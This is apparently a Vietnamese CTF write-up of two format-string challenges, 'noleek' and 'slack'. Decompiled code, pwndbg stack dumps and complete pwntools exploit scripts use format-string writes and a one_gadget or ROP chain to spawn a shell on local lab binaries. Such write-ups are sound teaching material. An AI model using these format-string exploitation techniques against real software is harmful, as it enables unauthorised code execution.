---
title: writeup format-string advance
date: 2025-02-14 00:00:00 +0800
categories: [pwn]
tags: [fsb]
author: "kuvee"
layout: post
---

all file [here]

## noleek  (angstromCTF)


### reversing

- 1 bài khá ngắn , đầu tiên nó sẽ mở file ```/dev/null``` , ta sẽ được input 2 lần với mỗi lần là 31 bytes , và tương ứng ta cũng có 2 bug ```fsb``` ở 2 lần input này 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[40]; // [rsp+0h] [rbp-30h] BYREF
  FILE *stream; // [rsp+28h] [rbp-8h]

  setbuf(_bss_start, 0LL);
  stream = fopen("/dev/null", "w");
  if ( stream )
  {
    printf("leek? ");
    fgets(s, 32, stdin);
    fprintf(stream, s);                         // fsb
    printf("more leek? ");
    fgets(s, 32, stdin);
    fprintf(stream, s);
    puts("noleek.");
    cleanup(0LL, 0LL, 0LL);
    return 0;
  }
  else
  {
    puts("wtf");
    return 1;
  }
}
```

checksec: PIE bậtật

```cs
pwndbg> checksec
File:     /home/ploi/pwn/FSB/noleek/noleek_patched
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
Stripped:   No
```

### EXPLOIT

- tuy nhiên ở bài này nó sử dụng ```fprintf``` thay vì ```printf``` , sau khi tìm hiểu thì mình hiểu nó sẽ in output của ta dựa trên ```fd``` và bài này nó chính là ```/dev/null``` , vậy ta sẽ không thể leak bất cứ thứ gì?

- đây là stack ở ```fprintf``` thứ nhất , ý tưởng của mình là tìm ra 1 con trỏ nào đó trỏ đến 1 địa chỉ khác , vậy ta có thể ghi nó thành địa chỉ ```saved_rip``` , tuy nhiên vì chỉ được input 31 bytes và ở stack cũng không có bất kì con trỏ nào hữu ích để thực hiện việc nàynày

```cs
pwndbg> tel
00:0000│ rdx rsi r8 rsp 0x7ffd874aa700 ◂— 0xa61 /* 'a\n' */
01:0008│-028            0x7ffd874aa708 ◂— 0
02:0010│-020            0x7ffd874aa710 —▸ 0x55b924c44290 (__libc_csu_init) ◂— push r15
03:0018│-018            0x7ffd874aa718 —▸ 0x55b924c440a0 (_start) ◂— xor ebp, ebp
04:0020│-010            0x7ffd874aa720 —▸ 0x7ffd874aa820 ◂— 1
05:0028│-008            0x7ffd874aa728 —▸ 0x55b9255842a0 ◂— 0xfbad2484
06:0030│ rbp            0x7ffd874aa730 —▸ 0x55b924c44290 (__libc_csu_init) ◂— push r15
07:0038│+008            0x7ffd874aa738 —▸ 0x7f38a7eabd0a (__libc_start_main+234) ◂— mov edi, eax
```

- lúc này thì nhớ ra ta còn 1 cách khác đó là sử dụng ```*``` , vậy ta có thể làm gì với nó?  ta sẽ dùng ```%*$c``` để in 4 byte và ghi vào 1 con trỏ khác 

- ý định rất rõ ràng ta , để dễ hiểu ta có thể tưởng tượng như sau: 

ta sẽ cần tìm 1 địa chỉ nào đó có số byte gần với A để thay đổi D thành A 

```cs
A-> libc_start_main  

B->C->D
C->D
```

- và nếu thay đổi thành công thì ta được thế này 

vậy lúc này ta hoàn toàn có thể dùng cách này và ghi vào libc_start_main đúng chứ???

```cs
A->libc_start_main

B->C->A->libc_start_main
C->A->libc_start_main
```

- sau 1 lúc tìm kiếm trên stack thì mình vẫn chưa thấy , tuy nhiên khi nhìn vào ```rsi```  nó là ```0x7ffd37473a30``` so với ```0x7ffd37473a68``` saved_rip , vậy ta hoàn toàn có thể padding thêm cho nó bằng nhau đúng chứ?

![here](/assets/images/fsb1.png)

- ta cũng cần tìm 1 con trỏ như sơ đồ ở trên =))) ta sẽ thử với ```0x7ffd37473af0```

![here](/assets/images/fsb2.png)

- như ta đã thấy ta đã thành công trong việc thay đổi nó :

bây giờ ta chỉ cần tìm offset của ```0x7ffe2c925c58``` và kết hợp tương tự với 1 địa chỉ libc ở đâu đó trên stack hoặc ```reg``` và padding thêm với ```one_gadget```

![done](/assets/images/done.png)


- one_gadget : 

```cs
ploi@PhuocLoiiiii:~/pwn/FSB/noleek$ one_gadget ./libc.so.6
0xc961a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL || r12 is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp

0xc961d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL || r12 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xc9620 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```

- đây là mã asm của hàm ```clean_up``` , ta thấy nó sẽ setup 3 thằng đó về NULL vậy ta sẽ chọn one_gadget ```0xc9620```

```cs
.text:0000000000001185                 push    rbp
.text:0000000000001186                 mov     rbp, rsp
.text:0000000000001189                 mov     [rbp+var_4], edi
.text:000000000000118C                 mov     [rbp+var_8], esi
.text:000000000000118F                 mov     [rbp+var_C], edx
.text:0000000000001192                 nop
.text:0000000000001193                 pop     rbp
.text:0000000000001194                 retn
```

- ta sẽ thử ghi địa chỉ này vào 

![here](/assets/images/fsb3.png)

- trước khi overwrite

```cs
18:00c0│+090 0x7ffd277e2230 —▸ 0x7ffd277e2298 —▸ 0x7ffd277e21a8 —▸ 0x7fa646418d0a (__libc_start_main+234) ◂— mov edi, eax
19:00c8│+098 0x7ffd277e2238 —▸ 0x7ffd277e22a8 —▸ 0x7ffd277e2c66 ◂— 'SHELL=/usr/bin/bash'
1a:00d0│+0a0 0x7ffd277e2240 —▸ 0x7fa6465f8180 —▸ 0x55e00ede5000 ◂— 0x10102464c457f
1b:00d8│+0a8 0x7ffd277e2248 ◂— 0
1c:00e0│+0b0 0x7ffd277e2250 ◂— 0
1d:00e8│+0b8 0x7ffd277e2258 —▸ 0x55e00ede60a0 (_start) ◂— xor ebp, ebp
1e:00f0│+0c0 0x7ffd277e2260 —▸ 0x7ffd277e2290 ◂— 1
1f:00f8│+0c8 0x7ffd277e2268 ◂— 0
pwndbg>
20:0100│+0d0 0x7ffd277e2270 ◂— 0
21:0108│+0d8 0x7ffd277e2278 —▸ 0x55e00ede60ca (_start+42) ◂— hlt
22:0110│+0e0 0x7ffd277e2280 —▸ 0x7ffd277e2288 ◂— 0x1c
23:0118│+0e8 0x7ffd277e2288 ◂— 0x1c
24:0120│+0f0 0x7ffd277e2290 ◂— 1
25:0128│+0f8 0x7ffd277e2298 —▸ 0x7ffd277e21a8 —▸ 0x7fa646418d0a (__libc_start_main+234) ◂— mov edi, eax
```

- sau khi overwrite

```cs
18:00c0│+090 0x7ffd277e2230 —▸ 0x7ffd277e2298 —▸ 0x7ffd277e21a8 —▸ 0x7fa6464188e9 ◂— mov r8, rax
19:00c8│+098 0x7ffd277e2238 —▸ 0x7ffd277e22a8 —▸ 0x7ffd277e2c66 ◂— 'SHELL=/usr/bin/bash'
1a:00d0│+0a0 0x7ffd277e2240 —▸ 0x7fa6465f8180 —▸ 0x55e00ede5000 ◂— 0x10102464c457f
1b:00d8│+0a8 0x7ffd277e2248 ◂— 0
1c:00e0│+0b0 0x7ffd277e2250 ◂— 0
1d:00e8│+0b8 0x7ffd277e2258 —▸ 0x55e00ede60a0 (_start) ◂— xor ebp, ebp
1e:00f0│+0c0 0x7ffd277e2260 —▸ 0x7ffd277e2290 ◂— 1
1f:00f8│+0c8 0x7ffd277e2268 ◂— 0
pwndbg>
20:0100│+0d0 0x7ffd277e2270 ◂— 0
21:0108│+0d8 0x7ffd277e2278 —▸ 0x55e00ede60ca (_start+42) ◂— hlt
22:0110│+0e0 0x7ffd277e2280 —▸ 0x7ffd277e2288 ◂— 0x1c
23:0118│+0e8 0x7ffd277e2288 ◂— 0x1c
24:0120│+0f0 0x7ffd277e2290 ◂— 1
25:0128│+0f8 0x7ffd277e2298 —▸ 0x7ffd277e21a8 —▸ 0x7fa6464188e9 ◂— mov r8, rax
```

- vậy đơn giản ta sẽ làm 1 phép tính đơn giản (og + libc_base) - địa chỉ vừa ghi  , ta sẽ padding thêm số byte với địa chỉ vừa ghi là sẽ thành công


exp : 


```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./noleek_patched")
libc = ELF("./libc-2.31.so")

context.binary = exe

#p = process()
p = remote('localhost',5000)

payload = f'%*c%{0x38}c%29$n'.encode()
input()
p.sendlineafter(b'leek? ',payload)

offset = 42

payload2 = f'%*16$c%{0xa5d37}c%42$n'.encode()
log.info(f'one_gadget: {hex(0xc9620)}')
input()
p.sendlineafter(b'more leek? ',payload2)
p.interactive()
```

- enjoy flag ^^

![here](/assets/images/flagfsb.png)

- ở đây ta cần chú ý 1 vài điều , ```libc_start_main_ret``` cũng có thể in ra tuy nhiên vì ta cùng lúc ghi và lúc đọc nên có thể xảy ra lỗi , ta có thể sử dụng %n hoặc lớn hơn vì nó ghi vào ```/dev/null```
- cuối cùng là 1 lưu ý khi sử dụng "*" , nó sẽ trỏ đến có kiểu là ```int``` , vì vậy nếu đó là số âm thì nó sẽ bị sai , nếu sai thì ta cần thử lại chày cối nhiều lần là được

ref [here](https://github.com/johnathanhuutri/CTFWriteup/tree/master/2023/angstromCTF/noleek)


## slack


### overview

checksec: 

```cs
ploi@PhuocLoiiiii:~/pwn/FSB/slack$ checksec slack
[*] '/home/ploi/pwn/FSB/slack/slack'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
- ta sẽ bỏ qua những hàm không quan trọng ở bài này và vào vấn đề chính , ta sẽ có 1 loop với 3 lần input và 3 lần ```fsb```

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int v4; // eax
  int i; // [rsp+8h] [rbp-68h]
  __gid_t rgid; // [rsp+Ch] [rbp-64h]
  time_t timer; // [rsp+10h] [rbp-60h] BYREF
  struct tm *tp; // [rsp+18h] [rbp-58h]
  char s[32]; // [rsp+20h] [rbp-50h] BYREF
  char format[40]; // [rsp+40h] [rbp-30h] BYREF
  unsigned __int64 v13; // [rsp+68h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  puts("Welcome to slack (not to be confused with the popular chat service Slack)!");
  timer = time(0LL);
  tp = localtime(&timer);
  v3 = time(0LL);
  srand(v3);
  for ( i = 0; i <= 2; ++i )
  {
    strftime(s, 0x1AuLL, "%Y-%m-%d %H:%M:%S", tp);
    v4 = rand();
    printf("%s -- slack Bot:  %s\n", s, (&messages)[v4 % 8]);
    printf("Your message (to increase character limit, pay $99 to upgrade to Professional): ");
    fgets(format, 14, stdin);
    tp = localtime(&timer);
    strftime(s, 0x1AuLL, "%Y-%m-%d %H:%M:%S", tp);
    printf("%s -- You: ", s);
    printf(format);
    putchar(10);
  }
  return v13 - __readfsqword(0x28u);
}
```

### EXPLOIT

- ở bài này ```FULL_RELRO``` nên sẽ không thể overwrite ```got``` được , nên có lẽ là ta sẽ build rop_chain và overwrite ```saved_rip``` , trước hết thì có lẽ ta cần leak libc và stack_addressaddress , 1 điều cần để ý nữa là ta chỉ có 13 byte để build nên sẽ hơi khó khăn tuy nhiên thì ta sẽ leak trước rồi tính sau

```cs
pl_leak = b'|%21$p|%25$p|'
input()
p.sendlineafter(b'Professional): ',pl_leak)
p.recvuntil(b'|')
libc.address = int(p.recvuntil(b'|')[:-1],16) - 0x29d90
log.info(f'libc: {hex(libc.address)}')

stack_leak = int(p.recvuntil(b'|')[:-1],16)
log.info(f'stack: {hex(stack_leak)}')
```

- lúc này vừa leak xong hết thì chỉ còn 2 lần được ```fsb``` T_T , mà cho dù có thêm 3 lần nữa cũng khó mà build rop_chain được =)) nên ý tưởng của ta là sẽ thay đổi giá trị đếm của loop thành 1 số âm (vì i là kiểu int nên khi nó âm -> 1 số lớn) và giá trị -1 sẽ là số lớn nhất trong ```int``` nó sẽ là 0x80xxxxxx
- vậy ta cần tìm 1 con trỏ nào đó để thay đổi nó trỏ đến biến ```i``` , lần ghi thứ 3 ta sẽ hoàn thành và lúc này loop vô hạn thì ta sẽ build thoải mái =))) 

- ```0x7fffffffd8a8``` địa chỉ này sẽ là địa chỉ thích hợp , vậy ta cần tính toán offset của nó và địa chỉ ta cần ghi 

![here](/assets/images/fsb5.png)

idx sẽ là 25

```cs
pwndbg> p/x (0x7fffffffd8a8-0x7fffffffd810)/8 +6
$5 = 0x19
pwndbg> p/d 0x19
$6 = 25
```

- ta cần tính toán địa chỉ leak được và địa chỉ của biến i , vì ta sẽ ghi byte cao nhất của nó nên ta sẽ +3 vào

```cs
00:0000│ rsp 0x7fffd189b1d0 ◂— 1
01:0008│-068 0x7fffd189b1d8 ◂— 0x3ea00000000
02:0010│-060 0x7fffd189b1e0 ◂— 0x67af3c21
03:0018│-058 0x7fffd189b1e8 —▸ 0x7f4fc06246a0 ◂— 0x3200000029 /* ')' */
04:0020│-050 0x7fffd189b1f0 ◂— '2025-02-14 12:50:41'
05:0028│-048 0x7fffd189b1f8 ◂— '14 12:50:41'
06:0030│-040 0x7fffd189b200 ◂— 0x7fff0031343a /* ':41' */
07:0038│-038 0x7fffd189b208 ◂— 0x10101000000
pwndbg>
08:0040│-030 0x7fffd189b210 ◂— '|%21$p|%25$p|'
09:0048│-028 0x7fffd189b218 ◂— 0x7c70243532 /* '25$p|' */
0a:0050│-020 0x7fffd189b220 —▸ 0x7fffd189b5c9 ◂— 0x34365f363878 /* 'x86_64' */
0b:0058│-018 0x7fffd189b228 ◂— 0x64 /* 'd' */
0c:0060│-010 0x7fffd189b230 ◂— 0x1000
0d:0068│-008 0x7fffd189b238 ◂— 0x558f68dadde8e500
0e:0070│ rbp 0x7fffd189b240 ◂— 1
0f:0078│+008 0x7fffd189b248 —▸ 0x7f4fc042cd90 ◂— mov edi, eax
pwndbg>
10:0080│+010 0x7fffd189b250 ◂— 0
11:0088│+018 0x7fffd189b258 —▸ 0x5615d5fc22c9 (main) ◂— endbr64
12:0090│+020 0x7fffd189b260 ◂— 0x1d189b340
13:0098│+028 0x7fffd189b268 —▸ 0x7fffd189b358 —▸ 0x7fffd189bc42 ◂— '/home/ploi/pwn/FSB/slack/slack_patched'
14:00a0│+030 0x7fffd189b270 ◂— 0
15:00a8│+038 0x7fffd189b278 ◂— 0x81ba5d8b3ca2843
16:00b0│+040 0x7fffd189b280 —▸ 0x7fffd189b358 —▸ 0x7fffd189bc42 ◂— '/home/ploi/pwn/FSB/slack/slack_patched'
17:00b8│+048 0x7fffd189b288 —▸ 0x5615d5fc22c9 (main) ◂— endbr64
pwndbg> p/x 0x7fffd189b358-0x7fffd189b1d8+3
$7 = 0x183
```

- việc tiếp theo ta sẽ đơn giản là change nó thành -1 (0x80) thôi , và build chuỗi rop_chain của mình

```cs
payload_change = f'%{change_var & 0xffff}c%25$hn'.encode()
payload_change = payload_change.ljust(13,b'a')

payload_change_var = f'%{0x80}c%55$hn'.encode()
p.sendlineafter(b'Professional): ',payload_change + payload_change_var)
pop_rdi = 0x000000000002a3e5 + libc.address
saved_rip = stack_leak - 0x110
log.info(f'saved_rip : {hex(saved_rip)}')
build_rop_chain = flat(
        pop_rdi+1,
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.sym.system,
        )
```

- lúc này ta build ```rop_chain``` thành công , việc cần làm tiếp theo là overwrite nó , tuy nhiên với đầu vào hạn chế ta phải thực hiện nó tương tự như change biến ```i``` , ta sẽ overwrite thành địa chỉ stack xong ghi từng byte vào 

```cs
for i in range(len(build_rop_chain)):
    payload = f'%{(saved_rip & 0xffff)+i}c%25$hn'.encode()
    payload = payload.ljust(13,b'a')

    if build_rop_chain[i] == 0:
        payload1 = b'%55$hhn'
    else:
        payload1 = f'%{build_rop_chain[i]}c%55$hhn'.encode()
    p.sendline(payload + payload1)
```

- ghi xong rồi thì change lại biến ```i``` và enjoy shell =)))

```cs
payload_change_var = f'%{0x2}c%55$hn'.encode()
input()
p.sendlineafter(b'Professional',payload_change + payload_change_var)
```

full exp : 


```cs
#!/usr/bin/env python3

from pwn import *

exe = ELF("./slack_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = remote('localhost',5000)

pl_leak = b'|%21$p|%25$p'
p.sendlineafter(b'Professional): ',pl_leak)
p.recvuntil(b'|')
libc.address = int(p.recvuntil(b'|')[:-1],16) - 0x29d90
log.info(f'libc: {hex(libc.address)}')

stack_leak = int(p.recvline()[:-1],16)
log.info(f'stack: {hex(stack_leak)}')
change_var = stack_leak - 0x17d


log.info(f'change: {hex(change_var)}')

payload_change = f'%{change_var & 0xffff}c%25$hn'.encode()
payload_change = payload_change.ljust(13,b'a')

payload_change_var = f'%{0x80}c%55$hn'.encode()
p.sendlineafter(b'Professional): ',payload_change + payload_change_var)
pop_rdi = 0x000000000002a3e5 + libc.address
saved_rip = stack_leak - 0x110
log.info(f'saved_rip : {hex(saved_rip)}')
build_rop_chain = flat(
        pop_rdi+1,
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.sym.system,
        )

for i in range(len(build_rop_chain)):
    payload = f'%{(saved_rip & 0xffff)+i}c%25$hn'.encode()
    payload = payload.ljust(13,b'a')

    if build_rop_chain[i] == 0:
        payload1 = b'%55$hhn'
    else:
        payload1 = f'%{build_rop_chain[i]}c%55$hhn'.encode()
    p.sendline(payload + payload1)


payload_change_var = f'%{0x2}c%55$hn'.encode()
input()
p.sendlineafter(b'Professional',payload_change + payload_change_var)



p.interactive()
```

![here](/assets/images/shellfsb.png)

- ngoài ra cũng có 1 bài rất hay về fsb , mình sẽ để ở [here](https://hackmd.io/@kuvee/SkaBUl2rJl)